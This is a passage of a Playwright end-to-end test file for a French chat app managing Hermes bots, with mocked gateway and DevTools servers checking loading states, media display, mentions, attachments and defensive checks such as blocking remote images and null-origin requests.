      return reply({ attached: true, path: `/x/${frame.params.filename}`, mime: 'image/png' })
    }
    if (frame.method === 'session.usage') return reply({ context_used: 41_000, context_max: 1_000_000, context_percent: 4.1, avg_tps: 62.6, total: 500 })
    if (frame.method === 'prompt.submit') {
      if (frame.params.queued === true) {
        queuedPrompts.push({ text: frame.params.text, apiText: frame.params.api_text })
        return reply({ admission_id: 'admission-file', status: 'queued', execution_generation: 1 })
      }
      promptCalls += 1
      const sessionId = frame.params.session_id
      reply({ admission_id: 'admission-test', status: 'started', execution_generation: 1 })
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      if (newBotHistory[sessionId]) {
        // A bot created in the app: the history keeps the text, the model reads `api_text`; its answer asks for its role.
        newBotPrompts.push(structuredClone(frame.params))
        const history = newBotHistory[sessionId]
        history.push({ row_id: history.length + 1, role: 'user', content: frame.params.text, timestamp: Date.now() })
        // Hermes keeps the lazy Bot Chat at its first prompt; its preview is the first user message.
        const owner = profiles.find((item) => `chat-${item.name}` === sessionId)
        if (owner && !owner.canonical_session) owner.canonical_session = { id: sessionId, resolved_id: sessionId, preview: frame.params.text, last_active: Date.now(), running: false }
        at(30, 'message.start', { turn_id: 'turn-intro' })
        setTimeout(() => history.push({ row_id: history.length + 1, role: 'assistant', content: NEW_BOT_REPLY, timestamp: Date.now() }), 1790)
        at(1800, 'message.complete', { turn_id: 'turn-intro', text: NEW_BOT_REPLY, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test média en direct') {
        const final = 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n\nEt la suite du texte.'
        at(30, 'message.start', { turn_id: 'turn-media' })
        at(80, 'message.delta', { turn_id: 'turn-media', text: 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n' })
        at(1800, 'message.delta', { turn_id: 'turn-media', text: '\nEt la suite du texte.' })
        at(2600, 'message.complete', { turn_id: 'turn-media', text: final, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test étapes') {
        at(30, 'message.start', { turn_id: 'turn-steps' })
        at(80, 'message.delta', { turn_id: 'turn-steps', segment: 0, offset: 0, text: 'Je regarde le code.' })
        at(120, 'message.interim', { turn_id: 'turn-steps', segment: 0, text: 'Je regarde le code.', already_streamed: true })
        at(160, 'tool.start', { tool_id: 'step-tool', name: 'terminal', context: 'npm test' })
        at(1300, 'tool.complete', { tool_id: 'step-tool', name: 'terminal' })
        // The app publishes a bot's work summary every 4 s: the step must stay the caption for longer than
        // that after the tool ends, whatever the phase of that timer when the turn starts.
        at(6100, 'message.delta', { turn_id: 'turn-steps', segment: 1, offset: 0, text: 'Les tests ' })
        at(6400, 'message.delta', { turn_id: 'turn-steps', segment: 1, offset: 10, text: 'passent.' })
        at(6800, 'message.complete', { turn_id: 'turn-steps', text: 'Les tests passent.', status: 'complete' })
        return
      }
      lastPromptText = frame.params.text
      lastApiText = frame.params.api_text
      if (frame.params.text === 'Test question') {
        at(30, 'message.start', { turn_id: 'turn-question' })
        at(90, 'clarify.request', { kind: 'clarify', prompt_id: 'q1', execution_generation: 1, question: 'Pour quel post ?', choices: ['Post A', 'Post B'], multi_select: false, timeout_s: 3600 })
        return
      }
      if (frame.params.text === 'Test pilotage') {
        at(30, 'message.start', { turn_id: 'turn-pilotage' })
        pilotageTurn = { at, sessionId }
        return
      }
      if (/^(?:Vois avec|Regarde ça|Test mode)/.test(frame.params.text)) {
        // The fake history does not keep this prompt: a slower reply leaves time to check its bubble.
        const end = frame.params.text.startsWith('Regarde ça') ? 1500 : 90
        at(30, 'message.start', { turn_id: 'turn-piece' })
        at(end, 'message.complete', { turn_id: 'turn-piece', text: 'Bien reçu.', status: 'complete' })
        return
      }
      if (frame.params.text.startsWith('Test mail')) {
        const id = frame.params.text.split(' ').pop()
        const draft = ['````hermes-mail', `Id: ${id}`, 'Draft-Id: 77', 'From: Bot <bot@exemple.test>', 'To: contact@exemple.test', 'Cc:', 'Subject: Re: Votre demande', 'Reply-Label: « Votre demande » de Contact', '', 'Bonjour,', '', 'Voici notre réponse.', '````'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-mail' })
        at(80, 'message.delta', { turn_id: 'turn-mail', text: draft.slice(0, 70) })
        at(900, 'message.complete', { turn_id: 'turn-mail', text: `Brouillon à valider :\n\n${draft}`, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test questions') {
        const text = ['Voici la page.', '', '## Questions ouvertes', '1. Avec quoi le client est-il reparti au bout des 5 jours ?', '2. L’Intensif est-il pour une seule personne ?', '3. Le bloc dirigeants reste-t-il au tutoiement ?'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-questions' })
        at(300, 'message.complete', { turn_id: 'turn-questions', text, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test questions libres') {
        const text = ['Avant de lancer, deux points.', '', 'Tes réponses avant de lancer', '', '1. Le repli en cascade te va, ou tu veux le repli strict ?', '2. Carbon : on garde l’article ou on le retire ?', '3. Tu veux voir la carte sur stage toi-même, ou mon contrôle suffit ?', '', 'Je lance dès que j’ai tout.'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-free-questions' })
        at(300, 'message.complete', { turn_id: 'turn-free-questions', text, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test liens') {
        const text = 'Voir [le lien Markdown](https://example.com/md) et aussi https://example.com/bare pour la suite.'
        at(30, 'message.start', { turn_id: 'turn-links' })
        at(300, 'message.complete', { turn_id: 'turn-links', text, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test recherche') {
        const text = ['Zéphyr est le premier mot.', '', 'Le deuxième paragraphe parle d’autre chose, puis de zephyr en minuscules.', '', 'Et pour finir ZÉPHYR en capitales.'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-search' })
        at(300, 'message.complete', { turn_id: 'turn-search', text, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test silence') {
        at(30, 'message.start', { turn_id: 'turn-silence' })
        at(80, 'message.delta', { turn_id: 'turn-silence', text: 'NO' })
        at(300, 'message.delta', { turn_id: 'turn-silence', text: 'REPLY' })
        at(900, 'message.complete', { turn_id: 'turn-silence', text: 'NOREPLY', status: 'complete' })
        return
      }
      setTimeout(() => send(socket, event(sessionId, 'message.start', { turn_id: 'turn-test' })), 30)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Réponse ' })), 60)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Hermes simulée.' })), 90)
      const turnMs = frame.params.text === 'Test animation' ? 3000 : 130
      setTimeout(() => send(socket, event(sessionId, 'message.complete', { turn_id: 'turn-test', text: 'Réponse Hermes simulée.', status: 'complete' })), turnMs)
      return
    }
    if (frame.method === 'session.interrupt') {
      interruptCalls.push(frame.params)
      reply({ execution_state: 'idle', execution_generation: 1 })
      // Like Hermes: the interrupted turn ends, then the queued priority message goes through.
      if (pilotageTurn) {
        const { at } = pilotageTurn
        pilotageTurn = null
        at(20, 'message.complete', { turn_id: 'turn-pilotage', text: '', status: 'interrupted' })
        at(80, 'message.start', { turn_id: 'turn-prio' })
        at(160, 'message.complete', { turn_id: 'turn-prio', text: 'Pilotage terminé.', status: 'complete' })
      }
      return
    }
    if (frame.method === 'clarify.respond' || frame.method === 'approval.respond') {
      promptAnswers.push({ method: frame.method, ...frame.params })
      reply({ status: 'resolved', prompt_id: frame.params.prompt_id })
      const sessionId = frame.params.session_id
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      at(20, frame.method === 'clarify.respond' ? 'clarify.settled' : 'approval.settled', { prompt_id: frame.params.prompt_id, execution_generation: 1 })
      // Like the real gateway: a multi-part question arrives part by part.
      if (frame.params.prompt_id === 'q1') at(60, 'clarify.request', { kind: 'clarify', prompt_id: 'q2', execution_generation: 1, question: 'Que doit montrer l’image ?', choices: ['Personnage', 'Accessoires', 'Décor'], multi_select: true })
      if (frame.params.prompt_id === 'q2') at(60, 'clarify.request', { kind: 'clarify', prompt_id: 'q3', execution_generation: 1, question: 'Une remarque ?', choices: [], multi_select: false })
      if (frame.params.prompt_id === 'q3') at(80, 'message.complete', { turn_id: 'turn-question', text: 'Images prêtes.', status: 'complete' })
      if (frame.params.prompt_id === 'q-reprise') at(80, 'message.complete', { turn_id: 'turn-reprise', text: 'Reprise terminée.', status: 'complete' })
      return
    }
    send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4000, message: `unknown ${frame.method}` } })
  })
})

mock.on('upgrade', (request, socket, head) => {
  if (new URL(request.url, 'http://127.0.0.1:9121').pathname !== '/api/ws') return socket.destroy()
  if (localMode) localSocketOrigins.push(request.headers.origin || '')
  wss.handleUpgrade(request, socket, head, (client) => wss.emit('connection', client, request))
})

// Simulated CDP Chrome: no real navigation and no paid bot.
let cdpUrl = 'https://store.steampowered.com/login/'
const cdpExpressions = []
const cdpInjections = []
const cdpMock = http.createServer((request, response) => {
  if (request.url !== '/json/list') { response.statusCode = 404; return response.end() }
  response.setHeader('Content-Type', 'application/json')
  response.end(JSON.stringify([
    { id: 'onglet-leurre', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-leurre' },
    { id: 'onglet-steam', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-steam' },
  ]))
})
const cdpWss = new WebSocketServer({ noServer: true })
cdpWss.on('connection', (socket, request) => {
  const target = request.url.split('/').pop()
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    const { id, method, params } = frame
    if (method === 'Runtime.evaluate') {
      cdpExpressions.push(params.expression)
      if (params.expression === 'window.location.origin') {
        return send(socket, { id, result: { result: { type: 'string', value: new URL(cdpUrl).origin } } })
      }
      return send(socket, { id, result: { result: { type: 'object', objectId: 'champs-actifs' } } })
    }
    if (method === 'Runtime.callFunctionOn') {
      const values = params.arguments.map((argument) => argument.value)
      cdpInjections.push({ target, origin: new URL(cdpUrl).origin, values })
      const filled = values.length === 2 ? ['identifier', 'password'] : ['code']
      return send(socket, { id, result: { result: { type: 'object', value: { filled } } } })
    }
    send(socket, { id, error: { message: 'unsupported' } })
  })
})
cdpMock.on('upgrade', (request, socket, head) => {
  if (!/^\/devtools\/page\/(onglet-leurre|onglet-steam)$/.test(request.url)) return socket.destroy()
  cdpWss.handleUpgrade(request, socket, head, (client) => cdpWss.emit('connection', client, request))
})

let child
let vaultService
let browser
try {
  await new Promise((resolve) => mock.listen(9121, '127.0.0.1', resolve))
  await new Promise((resolve) => cdpMock.listen(9223, '127.0.0.1', resolve))
  for (const args of [['create-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['unlock-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['set-keychain-settings', BROWSER_VAULT_KEYCHAIN]]) {
    await execFileAsync('/usr/bin/security', args)
  }
  vaultService = spawn(process.execPath, ['server/browser-vault/standalone.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env, BROWSER_VAULT_PORT: '4333', BROWSER_VAULT_CDP_ORIGIN: 'http://127.0.0.1:9223',
      HERMESBOT_KEYCHAIN: BROWSER_VAULT_KEYCHAIN, HERMESBOT_VAULT_AUDIT: BROWSER_VAULT_AUDIT, HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      HERMES_ORIGIN: 'http://127.0.0.1:9121',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let vaultLog = ''
  vaultService.stdout.on('data', (data) => { vaultLog += data })
  vaultService.stderr.on('data', (data) => { vaultLog += data })
  for (let attempt = 0; attempt < 50 && !vaultLog.includes('HermesBot vault on'); attempt += 1) await delay(100)
  if (!vaultLog.includes('HermesBot vault on')) throw new Error(`Le coffre ne démarre pas : ${vaultLog}`)
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let serverLog = ''
  child.stdout.on('data', (data) => { serverLog += data })
  child.stderr.on('data', (data) => { serverLog += data })
  let ready = false
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) { ready = true; break } } catch { /* server not ready */ }
    await delay(100)
  }
  if (!ready) throw new Error(`Serveur de test indisponible: ${serverLog}`)

  if ((await fetch('http://127.0.0.1:4332/api/health', { headers: { Origin: 'null' } })).status !== 403) throw new Error('Origin null accepté.')

  browser = await chromium.launch({ headless: true, channel: 'chrome' })
  // French interface: the texts searched below come from the French catalog.
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 }, locale: 'fr-FR' })
  // E2E_CPU_SLOWDOWN=4 runs the page on a CPU four times slower: a local way to find the checks that only
  // hold on a fast machine, before a slower CI runner finds them.
  const slowdown = Number(process.env.E2E_CPU_SLOWDOWN)
  if (slowdown > 1) await (await page.context().newCDPSession(page)).send('Emulation.setCPUThrottlingRate', { rate: slowdown })
  // macOS notifications: recorded instead of shown, permission already granted.
  await page.addInitScript(() => {
    window.__notifications = []
    window.Notification = class {
      static permission = 'granted'
      static requestPermission() { return Promise.resolve('granted') }
      constructor(title, options = {}) { this.title = title; this.body = options.body; this.tag = options.tag; window.__notifications.push(this) }
      close() {}
    }
  })
  // Dictation: a fake native bridge, scripted by the test (the real one needs a microphone and the Swift helper).
  await page.addInitScript(() => {
    const listeners = new Set()
    const calls = []
    const state = { access: 'granted', microphone: true, exists: true, onDevice: true, available: true, startResult: true, finalText: '' }
    const emit = (event) => listeners.forEach((listener) => listener(event))
    window.__dictation = { calls, state, emit }
    window.hermesBot = {
      platform: 'electron',
      restartTunnel: async () => {},
      focusWindow: async () => {},
      dictation: {
        prepare: async (localeId) => { calls.push({ method: 'prepare', localeId }); const { access, microphone, exists, onDevice, available } = state; return { access, microphone, exists, onDevice, available } },
        start: async (options) => { calls.push({ method: 'start', ...options }); return state.startResult },
        stop: async () => {
          calls.push({ method: 'stop' })
          setTimeout(() => {
            if (state.finalText) emit({ type: 'words', text: state.finalText, final: true })
            emit({ type: 'audioEnd' })
            emit({ type: 'done' })
          }, 80)
        },
        cancel: async () => { calls.push({ method: 'cancel' }) },
        onEvent: (listener) => { listeners.add(listener); return () => listeners.delete(listener) },
      },
    }
  })
  const notificationsSent = () => page.evaluate(() => window.__notifications.map(({ title, body, tag }) => ({ title, body, tag })))
  const errors = []
  page.on('pageerror', (error) => errors.push(error.message))
  // Chromium announces the request before the CSP blocks it: only a CSP refusal removes it from the list.
  page.on('request', (request) => { if (request.url().includes('evil.example')) remoteRequests.push(request.url()) })
  page.on('requestfailed', (request) => {
    if (request.failure()?.errorText === 'csp') remoteRequests.splice(remoteRequests.indexOf(request.url()), 1)
  })
  await page.goto('http://127.0.0.1:4332/', { waitUntil: 'domcontentloaded' })
  await page.locator('.login-card').waitFor({ timeout: 15_000 })
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  // Slow gateway: waiting screen, never "Aucun bot", then the conversation skeleton.
  const releaseProfiles = holdReplies('profiles.list')
  const releaseResume = holdReplies('session.resume')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('.app-loading').getByText('Chargement…', { exact: true }).waitFor({ timeout: 15_000 })
  await page.locator('.app-loading .loading-heart .logo-mark').waitFor({ timeout: 5_000 })
  if (await page.locator('.app-loading .loading-heart').evaluate((heart) => getComputedStyle(heart.querySelector('.logo-mark')).animationName) !== 'logo-heartbeat') throw new Error('Le logo du chargement ne bat pas.')
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  await page.screenshot({ path: `${SCREENSHOTS}loading-app.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await delay(200)
  await page.screenshot({ path: `${SCREENSHOTS}loading-app-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  // Reduced motion: the logo stands still.
  const heartbeat = () => page.locator('.app-loading .loading-heart .logo-mark').evaluate((logo) => getComputedStyle(logo).animationName)
  // The style follows the emulated preference a moment later on a slow machine: wait for it instead of reading once.
  const heartbeatIs = (name) => page.waitForFunction((expected) => {
    const logo = document.querySelector('.app-loading .loading-heart .logo-mark')
    return Boolean(logo) && getComputedStyle(logo).animationName === expected
  }, name, { timeout: 5_000 }).then(() => true, () => false)
  await page.emulateMedia({ reducedMotion: 'reduce' })
  if (!await heartbeatIs('none')) throw new Error(`Le logo du chargement bat malgré « réduire les animations » (${await heartbeat()}).`)
  // Back to "no-preference", Playwright's own default, and not to null: null hands the choice to the machine,
  // and a CI runner that prefers reduced motion would then run every later step without animated avatars.
  await page.emulateMedia({ reducedMotion: 'no-preference' })
  if (!await heartbeatIs('logo-heartbeat')) throw new Error(`Le logo du chargement ne bat plus (${await heartbeat()}).`)
  releaseProfiles()
  await page.locator('.chat-skeleton span').first().waitFor({ timeout: 15_000 })
  await page.locator('.chat-loading').getByText('Ouverture de la conversation avec Nova…').waitFor({ timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}loading-chat.png` })
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  releaseResume()
  await page.locator('.chat-loading').waitFor({ state: 'detached', timeout: 15_000 })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.bot-row').count() !== 3) throw new Error('Le roster doit montrer Nova, Orion et le chat local, sans les profils système.')
  await page.getByText('Je suis ton bot Hermes de test.').waitFor()
  // The right-hand panel stays closed after login and after switching bots; only its toggle opens it.
  if (await page.locator('.details-panel').count()) throw new Error('Le panneau de droite doit rester fermé après la connexion.')
  await page.locator('[data-bot=orion]').click()
  await page.getByRole('textbox', { name: 'Message à Orion' }).waitFor({ timeout: 5_000 })
  if (await page.locator('.details-panel').count()) throw new Error('Le panneau de droite doit rester fermé après un changement de bot.')
  await page.locator('[data-bot=nova]').click()
  await page.getByRole('textbox', { name: 'Message à Nova' }).waitFor({ timeout: 5_000 })
  await page.getByRole('textbox', { name: 'Message à Nova' }).fill('Test animation')
  await page.getByRole('textbox', { name: 'Message à Nova' }).press('Enter')
  await page.getByRole('button', { name: 'Afficher les détails du bot' }).click()
  await page.locator('.details-panel .live-avatar.is-working img.live-avatar-motion').waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => { const image = document.querySelector('.details-panel .live-avatar.is-working img.live-avatar-motion'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 2_500 })
  // Status visible at a glance: banner, roster row, chat header.
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .live-avatar.is-working img.live-avatar-motion').waitFor({ timeout: 2_000 })
  await page.locator('.chat-identity.is-working .chat-status').getByText('Au travail').waitFor({ timeout: 2_000 })
  await delay(600) // let the entrance animations finish: headless Chrome only advances them on demand
  await page.screenshot({ path: `${SCREENSHOTS}nova-working-ui.png` })
  await page.locator('.details-panel .live-avatar.is-done img.live-avatar-motion').waitFor({ timeout: 6_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-done').getByText('Terminé').waitFor({ timeout: 2_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}nova-done-ui.png` })
  // Bot never opened, woken by another bot: only its `session.active_list` reports it as working.
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  if (!activeListParams.some((params) => params.profile === 'orion')) throw new Error('session.active_list n’est pas demandé pour le profil du bot.')
  delete liveStatusByProfile.orion
  await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 9_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 9_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await page.locator('.messages-scroll').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le chat.')
  for (const hidden of ['Background process', 'Délégation terminée', 'demande entre bots', 'OUT-OF-BAND']) {
    if (await page.locator('.messages-scroll').getByText(hidden).count()) throw new Error(`« ${hidden} » est visible dans le chat.`)
  }
  await page.locator('.messages-scroll').getByText('Message glissé pendant le tour').waitFor({ timeout: 5_000 })
  await page.locator('.message-content a[href*="evil.example"]').waitFor({ timeout: 5_000 })
  if (await page.locator('.message-content img[src*="evil.example"]').count()) throw new Error('Image distante chargée.')
  if (await page.locator('.bot-row-preview').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le roster.')

  // MEDIA: media: gallery, video played with Range, fallback, viewer, never raw text or file://.
  await page.locator('.media-group.is-grid img.media-image').nth(1).scrollIntoViewIfNeeded()
  await page.waitForFunction(() => {
    const images = [...document.querySelectorAll('.media-group.is-grid img.media-image')]
    return images.length === 2 && images.every((image) => image.complete && image.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  if (!mediaRequests.some((item) => item.route === 'stream' && item.path === '/Users/test/videos/video.mp4' && item.range)) throw new Error('La vidéo n’est pas passée par /api/files/stream avec Range.')
  if (!mediaRequests.some((item) => item.route === 'download' && item.path === '/Users/test/visuels/slide 01.jpg' && item.profile === 'orion')) throw new Error('Image non relayée par /api/fs/download pour orion.')
  await page.locator('.media-fallback').getByText('absent.jpg').waitFor({ timeout: 5_000 })
  const rawMediaTag = await page.locator('.message-content p, .message-content .media-group').evaluateAll((nodes) => nodes.some((node) => node.textContent.includes('MEDIA:')))
  if (rawMediaTag) throw new Error('Une balise MEDIA: brute est visible dans le chat.')
  await page.locator('.message-content pre').getByText('MEDIA:/Users/test/exemple-de-syntaxe.png').waitFor()
  if (mediaRequests.some((item) => item.path.includes('exemple-de-syntaxe'))) throw new Error('Un exemple de code a été chargé comme média.')
  if (await page.locator('img[src^="file:"], video[src^="file:"], audio[src^="file:"]').count()) throw new Error('Un média est lu en file://.')
  await page.locator('.media-group.is-grid .media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.locator('.media-viewer-count').getByText('1 / 2').waitFor()
  await page.keyboard.press('ArrowRight')
  await page.locator('.media-viewer-count').getByText('2 / 2').waitFor()
  await page.waitForFunction(() => { const image = document.querySelector('.media-viewer img'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  // Headless Chrome only renders frames on demand: wait for the fade to end before the capture.
  await page.waitForFunction(() => getComputedStyle(document.querySelector('.media-viewer')).opacity === '1', null, { timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}media-viewer.png` })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.media-group.is-grid').scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}media-chat.png` })
  // Files quoted by path, without MEDIA:: readable under the message, never those inside a code block.
  const cited = page.locator('.message-assistant .cited-files')
  await cited.locator('.cited-files-label').getByText('3 fichiers cités').waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('.cited-files video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  await page.waitForFunction(() => { const image = document.querySelector('.cited-files img.media-image'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  await cited.locator('.media-fallback').getByText('absente.png').waitFor({ timeout: 5_000 })
  if (mediaRequests.some((item) => item.path.includes('exemple-cite'))) throw new Error('Un chemin d’un bloc de code a été chargé.')
  // A command in a code block: one click copies it, without the final line break.
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'http://127.0.0.1:4332' })
  const codeBlock = page.locator('.message-assistant .code-block').filter({ hasText: 'exemple-cite.mp4' })
  await codeBlock.hover()
  await codeBlock.getByRole('button', { name: 'Copier', exact: true }).click()
  await codeBlock.getByRole('button', { name: 'Copié', exact: true }).waitFor({ timeout: 3_000 })
  const copiedCode = await page.evaluate(() => navigator.clipboard.readText())
  if (copiedCode !== 'ls /Users/test/videos/exemple-cite.mp4') throw new Error(`Bloc de code mal copié : ${JSON.stringify(copiedCode)}`)
  await codeBlock.screenshot({ path: `${SCREENSHOTS}code-copy.png` })
  await cited.locator('.media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await cited.evaluate((element) => element.scrollIntoView({ block: 'center' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}cited-files.png` })
  // Mentions: @ opens the list, Enter picks, the note goes to the bot, the user only sees their own text.
  const orionBox = page.getByRole('textbox', { name: 'Message à Orion' })
  await page.locator('.message-user').getByText('Regarde avec').waitFor({ timeout: 5_000 })
  await page.locator('.message-user').getByText('[Fichier : ancien.pdf]').waitFor({ timeout: 2_000 })
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible après rechargement.')
  await orionBox.fill('Vois avec @no')
  await page.locator('.mention-menu').getByText('Nova', { exact: true }).waitFor({ timeout: 3_000 })
  if (await page.locator('.mention-menu').getByText('Orion', { exact: true }).count()) throw new Error('Le bot de la conversation est proposé.')
  await orionBox.press('Enter')
  await page.locator('.mention-menu').waitFor({ state: 'detached', timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Vois avec @nova ') throw new Error('Mention mal insérée.')
  if (await page.locator('.message-user').getByText('Vois avec').count()) throw new Error('Entrée a envoyé au lieu de choisir le bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user .mention-chip').getByText('@nova').last().waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })
  if (!lastPromptText.includes('@nova = agent profile "nova"') || !lastPromptText.includes('message_agent')) throw new Error('La note de mentions n’est pas partie.')
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible.')

  // Drag and drop: visible zone, images and files attached, empty file refused.
  await page.evaluate(() => {
    const transfer = new DataTransfer()
    for (const [name, type, body] of [['film.mp4', 'video/mp4', 'video'], ['dossier.pdf', 'application/pdf', 'pdf'], ['vignette.png', 'image/png', 'png'], ['vide.txt', 'text/plain', '']]) transfer.items.add(new File([body], name, { type }))
    window.__drop = transfer
    document.querySelector('.chat-panel').dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: transfer }))
  })
  await page.locator('.drop-overlay').getByText('Dépose pour joindre à Orion').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}drop-overlay.png` })
  await page.evaluate(() => document.querySelector('.chat-panel').dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: window.__drop })))
  await page.locator('.drop-overlay').waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  await page.locator('.composer-file').getByText('dossier.pdf').waitFor({ timeout: 2_000 })
  await page.locator('.composer-image img[alt="vignette.png"]').waitFor({ timeout: 2_000 })
  await page.locator('.toast').getByText('vide.txt est vide').waitFor({ timeout: 2_000 })
  await page.locator('.toast button').click()
  // The draft and its files stay on their bot.
  await orionBox.fill('Regarde ça')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await page.locator('.composer-file').count()) throw new Error('Les fichiers ont suivi sur un autre bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Regarde ça') throw new Error('Brouillon perdu au changement de bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user').getByText('[Fichier : film.mp4]').last().waitFor({ timeout: 5_000 })
  // The sent image shows in the bubble (gateway path), not as an "[Image : x]" label.
  await page.locator('.message-user', { hasText: '[Fichier : film.mp4]' }).last().locator('.cited-files.is-sent img').waitFor({ timeout: 5_000 })
  if (await page.locator('.message-user').getByText('[Image : vignette.png]').count()) throw new Error('L’image envoyée reste une étiquette.')
  for (let wait = 0; wait < 30 && !mediaRequests.some((item) => item.path === '/x/vignette.png'); wait++) await page.waitForTimeout(100)
  if (!mediaRequests.some((item) => item.path === '/x/vignette.png')) throw new Error(`L’image envoyée n’est pas relue depuis la gateway : ${JSON.stringify(mediaRequests.slice(-3))}`)
  // History: Hermes's vision note becomes the image, its text is hidden.
  if (await page.locator('.messages-scroll').getByText('The user sent an image').count()) throw new Error('La note de vision de Hermes est visible.')
